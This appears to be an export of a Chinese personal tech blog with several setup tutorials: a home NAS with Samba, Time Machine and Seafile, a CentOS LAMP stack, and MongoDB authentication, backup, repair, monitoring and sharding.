最近因为装了家庭影院买了盒子，再加上之前自己也想购买一个NAS，选过来选过去挑选了群晖NAS，但是无奈价格太贵，除了统一性、稳定性和群晖自身开发的系统之外没有任何的性价比可言，四硬盘位的NAS卖的更是离谱。\n家里有一台淘汰掉的主机，然后再加上自己有几块闲置的硬盘，便想出了自己搭建NAS服务器，因为每个IT男家中总会有那么一台或几台淘汰下来的机器和硬盘，即使你要组装一台新的机器，性价比也非常高。\n再加上自行组建NAS可玩性、灵活度较高，所以就敲定了这个方案。\n在3年前自己玩弄树莓派写了一篇文章，如今照着做了一遍感觉很多命令变化挺大的，所以也是重写一篇关于nas搭建的文章的动力。\n在配置的时候本来我想搭建一个下载服务器，找到mldonkey搭建，但是无奈配置了半天也没有搞定所以也就放弃了。最后我的解决方案是通过其他电脑下载然后拷贝到nas中。\n环境 系统我采用了Ubuntu 16.04 Server，因为在稳定性和节省系统资源比desktop版更胜一筹。如果你是想通过无线网络搭建NAS，那么第一次你需要使用网线连接安装Wi-Fi相关的包，如果没有网线或者你只需要无线网络，那么你可以使用desktop版本，因为desktop版自带了无线网卡的驱动。\n方案 搭建samba服务器，用于储存一些非私人资料，比如软件安装包、ISO镜像文件等，把samba共享给电视盒子，可以直接观看硬盘里面的电影。 搭建Time Machine，因为本人常用的是MacBook笔记本，所以搭建Time Machine就显得非常必要了 搭建seafile私有云服务，并提供给外网端口，用于外部访问。 为什么要搭建seafile，虽然Time Machine可以备份我的资料，但是无法让我在外面没有带电脑的时候取得资料，并且搭建seafile也算是一个双备份，因为上面的三个服务都是单独的一块硬盘，即使Time Machine或者seafile其中一个硬盘损坏，也不会造成数据丢失。\n准备工作 首先你可以查看你的硬盘情况，你可以通过lsblk命令查看，并通过fdisk命令进行分区。\n在三块硬盘分区好了后，我们开始格式化分区。我的环境中sda1用于samba，sdb1用于seafile，sdc1用于time machine，那么需要分别格式为不同的格式。\n因为time machine需要hfsplus格式，所以在格式化之前我们需要安装关于hfsplus的包。\n\u0026gt; apt install hfsplus hfsutils hfsprogs 然后我们开始格式化三个分区。\n\u0026gt; mkfs.ntfs -v /dev/sda1 \u0026amp;\u0026amp; mkfs.ext4 -v /dev/sdb1 \u0026amp;\u0026amp; mkfs.hfsplus -h /dev/sdc1 挂载三个分区\n\u0026gt; mkdir /var/samba \u0026amp;\u0026amp; mkdir /var/seafile \u0026amp;\u0026amp; mkdir /var/timemachine \u0026gt; mount -t ntfs /dev/sda1 /var/samba \u0026amp;\u0026amp; mount -t ext4 /dev/sdb1 /var/seafile \u0026amp;\u0026amp; mount -t hfsplus /dev/sdc1 /var/timemachine 然后通过lsblk命令检测三个分区是否挂载成功。\nsamba搭建 安装samba\n\u0026gt; apt install samba samba-common-bin 然后配置samba，在etc/samba/smb.conf最后添加\n[共享名字] path = 共享文件夹的路径 available = yes browseable = yes public = yes writable = yes 如果你需要让电视盒子发现你的共享目录你需要在etc/samba/smb.conf配置文件中的[global]项最后添加下面这段设置。\nfollow symlinks = yes wide links = yes unix extensions = no 然后重启samba服务\n\u0026gt; /etc/init.d/samba restart 至此我们samba服务已搭建完成\nTime Machine搭建 首先安装Netatalk，Netatalk 是一个开源的 AppleTalk 通信协议的实现，Linux 系统通过它可以充当 Mac 的文件服务器 、AppleTalk 路由、打印服务器等。\n\u0026gt; apt install netatalk 配置netatalk\n\u0026gt; echo 你的timemachine挂载目录路径 TimeMacheine options:tm \u0026gt;\u0026gt; /etc/netatalk/AppleVolumes.default 或者可以直接通过修改配置文件/etc/netatalk/AppleVolumes.default再最后添加\n你的timemachine挂载目录路径 TimeMacheine options:tm 然后重启netatalk服务\n\u0026gt; /etc/init.d/netatalk restart 安装avahi-daemon和libnss-mdns，添加Avahi和libnss可以让Mac电脑可以在Finder工具栏的共享里发现磁盘。\n\u0026gt; apt install avahi-daemon libnss-mdns 配置nsswitch.conf文件，在原有的hosts行后面添加mdns4 mdns\nhosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 mdns 修改Avahi的配置文件/etc/avahi/services/afpd.service，让nas主机能在局域网广播中AFP共享\n\u0026lt;?xml version=”1.0″ standalone=’no’?\u0026gt; \u0026lt;!-*-nxml-*-\u0026gt; \u0026lt;service-group\u0026gt; \u0026lt;name replace-wildcards=”yes”\u0026gt;%h\u0026lt;/name\u0026gt; \u0026lt;service\u0026gt; \u0026lt;type\u0026gt;_afpovertcp._tcp\u0026lt;/type\u0026gt; \u0026lt;port\u0026gt;548\u0026lt;/port\u0026gt; \u0026lt;/service\u0026gt; \u0026lt;service\u0026gt; \u0026lt;type\u0026gt;_device-info._tcp\u0026lt;/type\u0026gt; \u0026lt;port\u0026gt;0\u0026lt;/port\u0026gt; \u0026lt;txt-record\u0026gt;model=Xserve\u0026lt;/txt-record\u0026gt; \u0026lt;/service\u0026gt; \u0026lt;/service-group\u0026gt; 重启avahi服务\n\u0026gt; /etc/init.d/avahi-daemon restart 至此，Time Machine搭建完成。\n搭建seafile 目前seafile是我测试中觉得最好的一个开源的私有云服务，在测试中还有owncloud，但是对中文支持不太友好也就放弃了。\n关于seafile的搭建我这里就不进行阐述了，因为官方本身有中文文档并且文档写的清晰明了。\n","permalink":"/posts/homenas/","summary":"前言 最近因为装了家庭影院买了盒子，再加上之前自己也想购买一个NAS，选过来选过去挑选了群晖NAS，但是无奈价格太贵，除了统一性、稳定性和群晖自身开发的系统之外没有任何的性价比可言，四硬盘位的NAS卖的更是离谱。\n家里有一台淘汰掉的主机，然后再加上自己有几块闲置的硬盘，便想出了自己搭建NAS服务器，因为每个IT男家中总会有那么一台或几台淘汰下来的机器和硬盘，即使你要组装一台新的机器，性价比也非常高。\n再加上自行组建NAS可玩性、灵活度较高，所以就敲定了这个方案。\n在3年前自己玩弄树莓派写了一篇文章，如今照着做了一遍感觉很多命令变化挺大的，所以也是重写一篇关于nas搭建的文章的动力。\n在配置的时候本来我想搭建一个下载服务器，找到mldonkey搭建，但是无奈配置了半天也没有搞定所以也就放弃了。最后我的解决方案是通过其他电脑下载然后拷贝到nas中。\n环境 系统我采用了Ubuntu 16.04 Server，因为在稳定性和节省系统资源比desktop版更胜一筹。如果你是想通过无线网络搭建NAS，那么第一次你需要使用网线连接安装Wi-Fi相关的包，如果没有网线或者你只需要无线网络，那么你可以使用desktop版本，因为desktop版自带了无线网卡的驱动。\n方案 搭建samba服务器，用于储存一些非私人资料，比如软件安装包、ISO镜像文件等，把samba共享给电视盒子，可以直接观看硬盘里面的电影。 搭建Time Machine，因为本人常用的是MacBook笔记本，所以搭建Time Machine就显得非常必要了 搭建seafile私有云服务，并提供给外网端口，用于外部访问。 为什么要搭建seafile，虽然Time Machine可以备份我的资料，但是无法让我在外面没有带电脑的时候取得资料，并且搭建seafile也算是一个双备份，因为上面的三个服务都是单独的一块硬盘，即使Time Machine或者seafile其中一个硬盘损坏，也不会造成数据丢失。\n准备工作 首先你可以查看你的硬盘情况，你可以通过lsblk命令查看，并通过fdisk命令进行分区。\n在三块硬盘分区好了后，我们开始格式化分区。我的环境中sda1用于samba，sdb1用于seafile，sdc1用于time machine，那么需要分别格式为不同的格式。\n因为time machine需要hfsplus格式，所以在格式化之前我们需要安装关于hfsplus的包。\n\u0026gt; apt install hfsplus hfsutils hfsprogs 然后我们开始格式化三个分区。\n\u0026gt; mkfs.ntfs -v /dev/sda1 \u0026amp;\u0026amp; mkfs.ext4 -v /dev/sdb1 \u0026amp;\u0026amp; mkfs.hfsplus -h /dev/sdc1 挂载三个分区\n\u0026gt; mkdir /var/samba \u0026amp;\u0026amp; mkdir /var/seafile \u0026amp;\u0026amp; mkdir /var/timemachine \u0026gt; mount -t ntfs /dev/sda1 /var/samba \u0026amp;\u0026amp; mount -t ext4 /dev/sdb1 /var/seafile \u0026amp;\u0026amp; mount -t hfsplus /dev/sdc1 /var/timemachine 然后通过lsblk命令检测三个分区是否挂载成功。","title":"家庭NAS搭建"},{"content":"环境 系统版本：Centos 7.3 64位\n服务器：阿里云香港\n当前用户：root\n目标：搭建wordpress执行环境\n准备工作 如果你是在一个新的环境中搭建lamp环境，那么我建议你先更新升级系统，这样能保证系统为最新版本以及系统的安全性。\n\u0026gt; yum -y update \u0026gt; yum -y upgrade 安装Apache 首先安装Apache\n\u0026gt; yum -y install httpd 启动Apache\n\u0026gt; systemctl start httpd 设置Apache为开机启动\n\u0026gt; systemctl enable httpd 此时Apache搭建完成，系统的/var/www/html就是网站的根目录。访问服务器的外网ip或者域名就可以看见Apache已经搭建成功。\n安装PHP 安装PHP\n\u0026gt; yum -y install php 安装一些常用的PHP模块\n\u0026gt; yum -y install php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap curl curl-devel 重启Apache使php生效\n\u0026gt; systemctl restart httpd 我们可以通过在网站根目录建立一个phpinfo函数来查看php是否能解析。\n\u0026gt; echo \u0026#34;\u0026lt;?php phpinfo() ?\u0026gt;\u0026#34; \u0026gt;\u0026gt; /var/www/html/test.php 然后我们通过外网ip或域名访问这个文件，如果能够看到这个函数返回的一些信息，就表示php已经能够正常工作了。\n安装MariaDB MariaDb是Mysql的一个分支，也是以后会替代开源版的Mysql，兼容Mysql的所有功能语法，关于MariaDB的情况大家可以到网上进行了解。\n安装MariaDB\n\u0026gt; yum -y install mariadb-server mariadb 启动MariaDB\n\u0026gt; systemctl start mariadb.service 配置MariaDB为开机启动\n\u0026gt; systemctl enable mariadb.service 将php和MariaDB关联\n\u0026gt; yum -y install php-mysql 配置数据库 登陆mysql，默认情况下mysql的root密码是空的，第一次登陆提示输出密码通过回车键进行数据库，但是建议你第一次登陆后就修改mysql root用户的密码\n登陆mysql\n\u0026gt; mysql -u root -p 修改mysql root用户密码\nset password for root@localhost = password(\u0026#39;xxxx\u0026#39;); 建立数据库\nCREATE DATABASE blog; 切换至新建立的数据库\nuse blog; 一般情况为了安全，我们会单独建立一个用户，而这个用户只对其中一个数据库具有操作权限。\n建立新用户并给用户\ngrant all privileges on database.* to username@localhost identified by \u0026#39;password\u0026#39;; 更新数据库配置权限\nflush privileges; 配置Apache权限 根据上面的环境配置执行后，还需要配置Apache的权限，因为网站的根目录默认是root用户创建的，我们需要更改为Apache用户，这样php程序有权限操作当前目录。比如如果没有修改权限，那么Wordpress可能无法直接从后台更新、下载插件主题。\n查看apache用户和用户组，通过下面的命令我们可以直接在其中查看是否具有apache这个用户以及这个用户组\n\u0026gt; cat /etc/passwd \u0026gt; cat /etc/group 设置www目录为apache用户以及apache用户组\n\u0026gt; chown -R apache:apache www 最后我们重启apache服务器\n\u0026gt; systemctl restart httpd 配置.htaccess 如果你的程序不需要使用伪静态或者你还不需要使用到.htaccess文件，那么可以暂时不用配置，直到你需要它的时候。\n\u0026gt; vim /etc/httpd/conf/httpd.conf 找到/var/www/html目录的配置中的AllowOverride None修改为AllowOverride All。\n然后重启Apache\n\u0026gt; systemctl restart httpd 总结 此文只是搭建一个lamp的执行环境，如果关于其中的mysql、apache、php配置本文不包含。\n","permalink":"/posts/lamp/","summary":"环境 系统版本：Centos 7.3 64位\n服务器：阿里云香港\n当前用户：root\n目标：搭建wordpress执行环境\n准备工作 如果你是在一个新的环境中搭建lamp环境，那么我建议你先更新升级系统，这样能保证系统为最新版本以及系统的安全性。\n\u0026gt; yum -y update \u0026gt; yum -y upgrade 安装Apache 首先安装Apache\n\u0026gt; yum -y install httpd 启动Apache\n\u0026gt; systemctl start httpd 设置Apache为开机启动\n\u0026gt; systemctl enable httpd 此时Apache搭建完成，系统的/var/www/html就是网站的根目录。访问服务器的外网ip或者域名就可以看见Apache已经搭建成功。\n安装PHP 安装PHP\n\u0026gt; yum -y install php 安装一些常用的PHP模块\n\u0026gt; yum -y install php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap curl curl-devel 重启Apache使php生效\n\u0026gt; systemctl restart httpd 我们可以通过在网站根目录建立一个phpinfo函数来查看php是否能解析。\n\u0026gt; echo \u0026#34;\u0026lt;?php phpinfo() ?\u0026gt;\u0026#34; \u0026gt;\u0026gt; /var/www/html/test.","title":"LAMP环境搭建"},{"content":"介绍 不管数据库是在多安全的环境或者本地环境，给数据库建立一个安全的环境是很有必要的。\nMongodb提供了一系列的安全功能，这里介绍一种很常用的身份验证方式。\n开启验证 默认情况下，只要在启动数据库的时候没有加上--auth选项，就是没有身份验证功能的，所有客户端都可以进行所有权限的操作。\n如果加上过后，我们就可以通过安全的身份验证连接数据库。如果要在数据库中进行身份验证，可以通过db.auth(username, password)，如果验证成功则返回1，反之。\n建立用户 建立用户我们可以通过db.createUser()方法来建立用户，比如下面这样：\ndb.createUser({user: \u0026#39;username\u0026#39;, pwd: \u0026#39;password\u0026#39;, roles: [ {role: \u0026#39;read\u0026#39;, db: \u0026#39;test\u0026#39;} ]}); db.createUser方法的接受一个对象，里面的user代表用户名，pwd代表密码，而roles是一个数组可以接受多个对象，每个对象可以对应作用于的数据库，其中的role字段代表对作用的数据库的权限，官方规定了一些列的内置角色，可以通过文档查询。\n删除用户 删除用户需要具有权限的用户进行操作，通过db.dropUser()方法进行，接受一个字符串，这个字符串就是用户名:\ndb.dropUser(\u0026#39;user1\u0026#39;); 获取用户 可以通过db.getUser()方法来获取用户信息，同样它接受一个字符串，字符串为用户名:\ndb.getUser(\u0026#39;user1\u0026#39;); 参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-auth/","summary":"介绍 不管数据库是在多安全的环境或者本地环境，给数据库建立一个安全的环境是很有必要的。\nMongodb提供了一系列的安全功能，这里介绍一种很常用的身份验证方式。\n开启验证 默认情况下，只要在启动数据库的时候没有加上--auth选项，就是没有身份验证功能的，所有客户端都可以进行所有权限的操作。\n如果加上过后，我们就可以通过安全的身份验证连接数据库。如果要在数据库中进行身份验证，可以通过db.auth(username, password)，如果验证成功则返回1，反之。\n建立用户 建立用户我们可以通过db.createUser()方法来建立用户，比如下面这样：\ndb.createUser({user: \u0026#39;username\u0026#39;, pwd: \u0026#39;password\u0026#39;, roles: [ {role: \u0026#39;read\u0026#39;, db: \u0026#39;test\u0026#39;} ]}); db.createUser方法的接受一个对象，里面的user代表用户名，pwd代表密码，而roles是一个数组可以接受多个对象，每个对象可以对应作用于的数据库，其中的role字段代表对作用的数据库的权限，官方规定了一些列的内置角色，可以通过文档查询。\n删除用户 删除用户需要具有权限的用户进行操作，通过db.dropUser()方法进行，接受一个字符串，这个字符串就是用户名:\ndb.dropUser(\u0026#39;user1\u0026#39;); 获取用户 可以通过db.getUser()方法来获取用户信息，同样它接受一个字符串，字符串为用户名:\ndb.getUser(\u0026#39;user1\u0026#39;); 参考 MongoDB权威指南(第2版)\nMongodb Docs","title":"Mongodb 身份验证"},{"content":"介绍 无论在什么情况下都应该进行数据备份，才能避免灾难性的数据损坏，下面将介绍两种备份方式，两种备份方式使用的场景也不一样，可以根据自身的使用情况进行选择\n复制文件备份 在复制数据库文件之前，我们可以通过db.fsynclock()方法让数据库禁止一切写入，并把所有在缓存中的信息全部同步到磁盘中，让所有的写操作进入队列，在没有取消锁之前，Mongodb不会对任何写操作进行处理。\n\u0026gt; db.fsyncLock(); 首先给数据库上锁，以免出现我们在备份的过程中同时还有数据写入 $ cp -R /data/blog/* /data/Backup/blog //复制数据库所有的文件到备份目录 \u0026gt; db.fsyncUnlock(); 解锁数据库，解锁后数据库将处理队列中的写操作 mongodump mongodump可以给正在运行的实例进行热备份，只需要通过指定端口，地址，如果在本机上面运行，只需要指定端口就可以进行热备份了。\n$ mongodump --port 27017 运行过后，mongodump会在当前目录建立一个dump文件夹，里面包含了我们备份的数据库数据。\n恢复 上面第一种方式很好恢复，把备份的数据文件复制回来就可以了，而经过mongodump备份的文件需要使用mongodb提供的另一个工具mongorestore。\nmongorestore通过给正在运行的实例进行恢复数据，下面是它的用法：\nmongorestore --port 27017 ./dump/ 参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-backup/","summary":"介绍 无论在什么情况下都应该进行数据备份，才能避免灾难性的数据损坏，下面将介绍两种备份方式，两种备份方式使用的场景也不一样，可以根据自身的使用情况进行选择\n复制文件备份 在复制数据库文件之前，我们可以通过db.fsynclock()方法让数据库禁止一切写入，并把所有在缓存中的信息全部同步到磁盘中，让所有的写操作进入队列，在没有取消锁之前，Mongodb不会对任何写操作进行处理。\n\u0026gt; db.fsyncLock(); 首先给数据库上锁，以免出现我们在备份的过程中同时还有数据写入 $ cp -R /data/blog/* /data/Backup/blog //复制数据库所有的文件到备份目录 \u0026gt; db.fsyncUnlock(); 解锁数据库，解锁后数据库将处理队列中的写操作 mongodump mongodump可以给正在运行的实例进行热备份，只需要通过指定端口，地址，如果在本机上面运行，只需要指定端口就可以进行热备份了。\n$ mongodump --port 27017 运行过后，mongodump会在当前目录建立一个dump文件夹，里面包含了我们备份的数据库数据。\n恢复 上面第一种方式很好恢复，把备份的数据文件复制回来就可以了，而经过mongodump备份的文件需要使用mongodb提供的另一个工具mongorestore。\nmongorestore通过给正在运行的实例进行恢复数据，下面是它的用法：\nmongorestore --port 27017 ./dump/ 参考 MongoDB权威指南(第2版)\nMongodb Docs","title":"Mongodb 备份及恢复"},{"content":"介绍 很多时候我们看见数据目录下有一个mongodb.lock文件，这个文件在开启了日志系统后不会出现，在没有开启日志系统的情况下非常重要，并且有时发现重新启动数据库的时候无法启动了，然后删除mongodb.lock又可以启动了，但是尽量不要这样做。\n当Mongodb启动的时候会建立一个mongodb.lock文件，而正常退出的时候就会删除这个文件，但是遇见非正常退出，这个文件就滞留了，Mongodb就会得知上一次是非正常退出，所以第一时间不是删除这个文件启动，而是尝试着修复数据，再进行启动。\nmongod \u0026ndash;repair mongod内置了一个修复数据的选项，这个工具相比与下面介绍的另一种工具来说这种在修复的速度上要稍微快一下，我们只需指定修复的数据库路径，然后加上选项就可以进行修复了。\n$ mongod --dbpath /data/blog --repair mongodump \u0026ndash;repair 相比上一种介绍的修复工具，mongodump的修复功能更加接近底层，数据恢复可能更好，但是需要在已经执行的实例上面进行修复，并且效率上面会比上一种要稍慢。\n$ mongodump --dbpath /data/blog --repair 参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-data-repair/","summary":"介绍 很多时候我们看见数据目录下有一个mongodb.lock文件，这个文件在开启了日志系统后不会出现，在没有开启日志系统的情况下非常重要，并且有时发现重新启动数据库的时候无法启动了，然后删除mongodb.lock又可以启动了，但是尽量不要这样做。\n当Mongodb启动的时候会建立一个mongodb.lock文件，而正常退出的时候就会删除这个文件，但是遇见非正常退出，这个文件就滞留了，Mongodb就会得知上一次是非正常退出，所以第一时间不是删除这个文件启动，而是尝试着修复数据，再进行启动。\nmongod \u0026ndash;repair mongod内置了一个修复数据的选项，这个工具相比与下面介绍的另一种工具来说这种在修复的速度上要稍微快一下，我们只需指定修复的数据库路径，然后加上选项就可以进行修复了。\n$ mongod --dbpath /data/blog --repair mongodump \u0026ndash;repair 相比上一种介绍的修复工具，mongodump的修复功能更加接近底层，数据恢复可能更好，但是需要在已经执行的实例上面进行修复，并且效率上面会比上一种要稍慢。\n$ mongodump --dbpath /data/blog --repair 参考 MongoDB权威指南(第2版)\nMongodb Docs","title":"Mongodb 数据修复"},{"content":"介绍 为什么要进行监控状态，因为在实际的情况中可能会发生一下无法预计的情况，比如阻塞的问题，阻塞的原因会有很多种情况造成，如果当我们查询文档的时候发生了阻塞，那么就会影响到后面的操作，甚至无法对后面的操作进行响应。\n我们可以通过监控很快速的找到到底是哪里出了问题，这样有助于我们快速定位所在的问题，从而得到解决。\nMongodb官方提供了三种用语分析Mongodb的方式：\nMongodb自带的监控工具：用于提供数据库活动的实时报告 数据库命令：以更真实的情况返回数据库状态的统计信息 第三方平台托管监控 Mongodb自带监控工具 mongostat mongostat是官方随同mongodb下载包中一同下载的，你可以找到安装目录或者解压目录进行使用。\n我们可以通过mongostat --help()进行查询可用选项，也可以通过官方文档进行查询。\nMongostat默认所返回的信息都是基于秒为单位，比如返回的insert指的是每秒插入数据库的对象数，而如果我们限制了返回时间，那么这个返回的结果是基于限制时间的平均值。\n-O 和 -o 这两个选项功能非常实用，按照正常的情况，Mongostat输出的报告会有很多我们不需要的列，所以我们可以通过-o来实现，这个选项设置后只会包含我们选择想要列，并且这个选项可以重新命名列的名字，除此之外-o和-O还可以添加一些服务器状态到报表中，可以参考ServerStatus。\n默认的mongostat输出的内容大概如下，并且每秒钟都会返回一个状态：\ninsert query update delete getmore command flushes mapped vsize res faults qrw arw net_in net_out conn time *0 *0 *0 *0 0 2|0 0 0B 2.39G 14.0M 0 0|0 0|0 286b 13.8k 1 Aug 24 17:34:17.615 *0 *0 *0 *0 0 1|0 0 0B 2.39G 14.0M 0 0|0 0|0 285b 13.7k 1 Aug 24 17:34:18.618 *0 *0 *0 *0 0 2|0 0 0B 2.39G 14.0M 0 0|0 0|0 286b 13.8k 1 Aug 24 17:34:19.617 *0 *0 *0 *0 0 1|0 0 0B 2.39G 14.0M 0 0|0 0|0 285b 13.8k 1 Aug 24 17:34:20.617 下面的代码选项是重命名了insert列为cr，并只显示insert,query,update：\n$ mongostat --host localhost -o \u0026#39;insert=cr,query,update\u0026#39; 返回后的文档大概如下： cr query update *0 *0 *0 *0 *0 *0 *0 *0 *0 *0 *0 *0 -O选项除了输出默认的列之外，可以重命名列名，还可以添加ServerStatus一些字段输出到报表，比如插入文档的总数、主机地址、版本号等信息。\n$ mongostat --host localhost -O \u0026#39;insert=cr,host,version\u0026#39; 返回后的文档大概如下： cr query update delete getmore command flushes mapped vsize res faults qrw arw net_in net_out conn time cr host version *0 *0 *0 *0 0 2|0 0 0B 2.39G 14.0M 0 0|0 0|0 286b 13.8k 2 Aug 24 17:51:34.031 *0 localhost:27040 3.4.6 *0 *0 *0 *0 0 1|0 0 0B 2.39G 14.0M 0 0|0 0|0 285b 13.8k 2 Aug 24 17:51:35.032 *0 localhost:27040 3.4.6 *0 *0 *0 *0 0 2|0 0 0B 2.39G 14.0M 0 0|0 0|0 286b 13.8k 2 Aug 24 17:51:36.032 *0 localhost:27040 3.4.6 --rowcount --rowcount可以控制mongostat返回报表的频率，--rowcount接受的第一个参数为返回的次数，第二个参数是多少秒生成一次报表并返回。\n比如我想每五秒返回一次报表，共返回十次：\n$ mongostat --rowcount 10 5 --discover 监控副本集或分片的所有成员的统计信息。\nmongotop mongotop可以监控数据库或者副本集的成员中哪个集合最为繁忙。\n$ mongotop --host localhost:27030 返回大概如下内容： ns total read write 2017-08-25T20:50:06+08:00 admin.system.roles 0ms 0ms 0ms admin.system.version 0ms 0ms 0ms local.startup_log 0ms 0ms 0ms local.system.replset 0ms 0ms 0ms test.test 0ms 0ms 0ms 数据库命令 数据库命令可以提供比Mongodb自带的监控工具提供更细微的信息，如果上面的方法无法帮你定位到问题所在，你可以试试下面的数据库命令来操作问题的所在。\ndb.currentOp db.currentOp()方法可以列出数据中所有正在进行的所有操作，我们可以通过返回的信息中几个比较重要的字段来找出问题所在。\nopid: 操作的ID号，可以通过db.killOp()方法来结束进程，就像系统命令中的PID。 active: 表示该操作当前是否还在运行。 secs_running：这个字段非常重要，我们可以根据此字段判断哪个操作进行了阻塞。 op：操作的类型，比如是查询，可能显示的是query。 desc：表示当前操作在日志中的前缀，我们可以根据此前缀在日志中快速定位。 除此之外，我们还可以过滤参数，得到我们只想要的结果，下面是过滤其他不是当前正在查询的操作。\ndb.currentOp({op: \u0026#39;query\u0026#39;}); db.serverStatus db.serverStatus()方法返回数据库状态的一般概述，详细说明磁盘使用情况，内存使用，连接，日记记录和索引访问。\ndb.stats db.test.stats rs.status db.stats()方法返回当前数据库的信息，其中objects就代表的是当前数据库所含的所有文档数量。\ndb.test.stats()方法返回集合的信息\nrs.status()返回当前副本集的信息\n参考 MongoDB权威指南(第2版)\nMongodb Docs\n","permalink":"/posts/mongodb-monitoring/","summary":"介绍 为什么要进行监控状态，因为在实际的情况中可能会发生一下无法预计的情况，比如阻塞的问题，阻塞的原因会有很多种情况造成，如果当我们查询文档的时候发生了阻塞，那么就会影响到后面的操作，甚至无法对后面的操作进行响应。\n我们可以通过监控很快速的找到到底是哪里出了问题，这样有助于我们快速定位所在的问题，从而得到解决。\nMongodb官方提供了三种用语分析Mongodb的方式：\nMongodb自带的监控工具：用于提供数据库活动的实时报告 数据库命令：以更真实的情况返回数据库状态的统计信息 第三方平台托管监控 Mongodb自带监控工具 mongostat mongostat是官方随同mongodb下载包中一同下载的，你可以找到安装目录或者解压目录进行使用。\n我们可以通过mongostat --help()进行查询可用选项，也可以通过官方文档进行查询。\nMongostat默认所返回的信息都是基于秒为单位，比如返回的insert指的是每秒插入数据库的对象数，而如果我们限制了返回时间，那么这个返回的结果是基于限制时间的平均值。\n-O 和 -o 这两个选项功能非常实用，按照正常的情况，Mongostat输出的报告会有很多我们不需要的列，所以我们可以通过-o来实现，这个选项设置后只会包含我们选择想要列，并且这个选项可以重新命名列的名字，除此之外-o和-O还可以添加一些服务器状态到报表中，可以参考ServerStatus。\n默认的mongostat输出的内容大概如下，并且每秒钟都会返回一个状态：\ninsert query update delete getmore command flushes mapped vsize res faults qrw arw net_in net_out conn time *0 *0 *0 *0 0 2|0 0 0B 2.39G 14.0M 0 0|0 0|0 286b 13.8k 1 Aug 24 17:34:17.615 *0 *0 *0 *0 0 1|0 0 0B 2.39G 14.0M 0 0|0 0|0 285b 13.7k 1 Aug 24 17:34:18.","title":"Mongodb 监测"},{"content":"介绍 分片是指将数据拆分，并分散放在多个服务器中组成一个集群，这可以将N台服务器的性能集中到一起来处理数据，这将很大程度的提高数据处理的速度。\n在Mongodb的分片中必须具备三个角色：\n路由服务器：用于处理和响应请求，并把各个分片服务器查询到的结果处理合并然后返回。 配置服务器(configServer)：存储集群、数据的描述信息。 分片服务器：用于储存拆分的数据服务器。 而这三个角色都是普通的数据库，只是扮演的角色不一样。\n它们的请求、响应流程就如下图中表示一样：\n因为所有的应用程序都是通过路由进行请求，所以对于应用程序来说，它没有什么不同就如请求一个普通数据服务器一样：\n搭建配置服务器 首先我们需要搭建配置服务器，配置服务器如同分片的大脑，保存着集群和数据的描述信息。\n因为Mongodb3.4版本后需要配置服务器必须配置为副本集，所以需要给配置服务器配置副本集，如果你还清楚如何搭建副本集，你可以试着看看我的上一篇文章《Mongodb 副本集》。\n首先建立三个空的数据库目录，用于搭建配置服务器的副本集，并分别启动它们，在启动的时候需要加上我们副本集的名称和--configsvr来表示这是一个配置服务器，并分别指定不同的端口。\n$ mkdir config0 config1 config2 $ mongod --dbpath config0 --replSet conServer --configsvr --port 27020 $ mongod --dbpath config1 --replSet conServer --configsvr --port 27021 $ mongod --dbpath config2 --replSet conServer --configsvr --port 27020 然后通过mongo随意进入一个副本集成员，并为配置服务器的副本集进行配置：\n$ mongo --port 27020 --host localhost \u0026gt; var conf = { _id: \u0026#39;conServer\u0026#39;, version: 1, members: [ { _id: 0, host: \u0026#39;localhost:27020\u0026#39; }, { _id: 1, host: \u0026#39;localhost:27021\u0026#39; }, { _id: 2, host: \u0026#39;localhost:27022\u0026#39; } ] }; \u0026gt; rs.initiate(conf); 至此我们的配置服务器配置完成。\n搭建分片服务器 官方建议我们的分片服务区至少在3个或以上才能发挥出更好的性能，我们这里也创建三个分片服务器。\n因为分片服务器没有强制要求必须是副本集，所以下面就创建了三个单机分片服务器，但是Mongodb接受分片服务器为副本集。\n下面创建三个空数据库目录，然后启动它们，在启动的时候需要加上--shardsvr以表示这是一个分片服务器:\n$ mkdir sh0 sh1 sh2 $ mongod --dbpath sh0 --shardsvr --port 27030 $ mongod --dbpath sh1 --shardsvr --port 27031 $ mongod --dbpath sh2 --shardsvr --port 27032 至此我们的分片服务器也搭建完成。\n搭建路由服务器 mongodb提供了一个路由工具，它会随着我们下载包一起下载，名字为mongos或mongos.exe，通过它配置路由功能。\n启动路由我们需要加上参数--configdb，它的语法为：\n--configdb 配置服务器副本集名称/配置服务器1地址端口,配置服务器1地址端口... 启动路由，并为路由指定一个端口，用于开放给客户端链接：\n$ mongos --configdb conServer/localhost:27020,localhost:27021,localhost:27022 --port 27040 至此路由已经搭建完成。\n配置分片 配置分片服务器 通过mongodb提供的mongo进入到路由服务器中进行配置，把我们开始创建的三个分片服务器通过sh.addShard()方法添加进行，这个方法接受一个字符串里面的格式为host:port。\n$ mongo --port 27040 --host localhost \u0026gt; sh.addShard(\u0026#39;localhost:27030\u0026#39;); \u0026gt; sh.addShard(\u0026#39;localhost:27031\u0026#39;); \u0026gt; sh.addShard(\u0026#39;localhost:27032\u0026#39;); 如果你可以通过rs.status()方法中返回的shards字段看是否添加成功。\n配置片键 到目前为止，分片服务器已经搭建完成，但是目前分片服务器无法正常工作，我们所有的操作都将在随机的一个主分片上操作，这是因为分片服务器不知道怎么进行分片，所以我们还需要配置片键来告诉分片服务器按照什么来分片。\n分片是基于数据库集合中的文档的一个键进行分片的，比如选择username键，那么会根据这个键的顺序就行分片，而mongodb会自动平衡分片的数据。\nMongodb要求作为片键的键必须是索引过的，所以我们在建立片键之前需要对键进行索引，建立后片键就是集合中的最重要的索引。\n在生产环境中建议先想好数据建构建立索引和片键后开始操作数据，这样会减轻分片服务器的负载。\n首先我们在需要进行分片的数据库上开启分片功能，通过sh.enableSharding方法开启。\n$ mongo --port 27040 --host localhost \u0026gt; sh.enableSharding(\u0026#39;test\u0026#39;); 然后在开启分片的数据库中的test集合插入测试数据，注意此时我们还没有进行配置片键，所以所有的数据操作都在分片服务器随机分配的一个主分片上面进行的。\n\u0026gt; for(var i = 0; i \u0026lt; 100; i++){ db.test.insert({ username: \u0026#39;user\u0026#39; + i, idNum: i }) } 这时候以username为片键，通过sh.shardCollection方法进行建立，它的语法为：\nsh.shardCollection(namespace, key, unique, options) 